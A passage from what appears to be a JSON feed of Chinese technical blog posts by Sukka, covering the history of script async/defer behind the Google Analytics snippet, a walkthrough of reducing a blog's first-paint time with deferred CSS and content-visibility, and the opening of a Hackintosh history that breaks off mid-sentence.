<span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\">\n<div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-13</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\">\n<div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-03</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook 